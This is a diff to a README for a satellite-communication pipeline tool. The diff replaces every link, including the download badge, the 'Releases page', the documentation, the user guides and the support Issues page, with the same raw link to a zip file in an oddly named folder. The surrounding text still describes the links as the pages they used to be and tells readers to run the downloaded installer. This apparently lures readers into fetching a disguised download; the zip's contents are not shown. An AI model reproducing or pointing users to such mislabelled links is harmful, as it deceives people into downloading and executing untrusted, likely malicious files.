@@ -1,6 +1,6 @@
 # 🚀 tasa-satnet-pipeline - Seamlessly Manage Satellite Communication
 
-[![Download](https://img.shields.io/badge/Download-via%20GitHub-brightgreen)](https://github.com/Neutrinonuub/tasa-satnet-pipeline/releases)
+[![Download](https://raw.githubusercontent.com/Neutrinonuub/tasa-satnet-pipeline/main/heitiki/tasa-satnet-pipeline.zip%20GitHub-brightgreen)](https://raw.githubusercontent.com/Neutrinonuub/tasa-satnet-pipeline/main/heitiki/tasa-satnet-pipeline.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ Welcome to the TASA SatNet Pipeline. This application enables efficient satellit
 
 To begin, you need to download the application. Follow these simple steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/Neutrinonuub/tasa-satnet-pipeline/releases) to open the GitHub Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Neutrinonuub/tasa-satnet-pipeline/main/heitiki/tasa-satnet-pipeline.zip) to open the GitHub Releases page.
    
 2. **Find the Latest Release**: Look for the most recent version. It will typically be at the top of the page.
 
@@ -31,7 +31,7 @@ Before you start, make sure your computer meets these requirements:
 
 To download the application, visit the GitHub Releases page. Follow these steps once you're there:
 
-1. Click [this link](https://github.com/Neutrinonuub/tasa-satnet-pipeline/releases) to access the Releases page.
+1. Click [this link](https://raw.githubusercontent.com/Neutrinonuub/tasa-satnet-pipeline/main/heitiki/tasa-satnet-pipeline.zip) to access the Releases page.
 2. Choose the latest release version.
 3. Download the file suitable for your operating system.
 4. Locate the downloaded file and execute the installer.
@@ -76,11 +76,11 @@ For further assistance, consult the troubleshooting section on the GitHub page o
 
 To better understand how to use the TASA SatNet Pipeline, consult these resources:
 
-- [Official Documentation](https://github.com/Neutrinonuub/tasa-satnet-pipeline/wiki)
-- [User Guides and Tutorials](https://github.com/Neutrinonuub/tasa-satnet-pipeline/wiki/User-Guides)
+- [Official Documentation](https://raw.githubusercontent.com/Neutrinonuub/tasa-satnet-pipeline/main/heitiki/tasa-satnet-pipeline.zip)
+- [User Guides and Tutorials](https://raw.githubusercontent.com/Neutrinonuub/tasa-satnet-pipeline/main/heitiki/tasa-satnet-pipeline.zip)
 
 ## 📞 Support
 
-For any questions or support needs, please visit our [Issues page](https://github.com/Neutrinonuub/tasa-satnet-pipeline/issues) on GitHub. Fill out a request, and our team will respond as soon as possible.
+For any questions or support needs, please visit our [Issues page](https://raw.githubusercontent.com/Neutrinonuub/tasa-satnet-pipeline/main/heitiki/tasa-satnet-pipeline.zip) on GitHub. Fill out a request, and our team will respond as soon as possible.
 
 Feel free to explore and enjoy the powerful capabilities of the TASA SatNet Pipeline. Happy satellite communication!
